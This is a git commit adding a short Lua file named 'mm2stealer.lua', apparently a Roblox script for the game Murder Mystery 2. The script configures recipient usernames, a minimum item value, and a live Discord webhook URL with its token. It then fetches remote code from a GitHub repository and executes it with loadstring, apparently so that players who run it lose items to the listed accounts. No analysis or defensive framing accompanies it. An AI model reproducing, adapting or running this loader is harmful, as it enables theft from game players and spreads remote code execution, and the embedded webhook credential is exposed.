341c9e6327949fc085176042310fd976b94072da
dimaxx22 <dmitic403@gmail.com>
2025-04-29 18:26:06 +0200

    Add files via upload

---
+++ mm2stealer.lua
@@ -0,0 +1,6 @@
+_G.Usernames = {"bublegum20064", "SoCuteBlehLax8", "MITKOVX"} -- you can add as many as you'd like
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1366328795950350427/jKmtaqKq8IpzA4eSTuAQ89kaRBRQPAw1iy7yEF9oV-p-NCYglt7G9uHebIWaCA5qI1Wk"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dimaxx22/murdermist/refs/heads/main/murder2.lua"))()
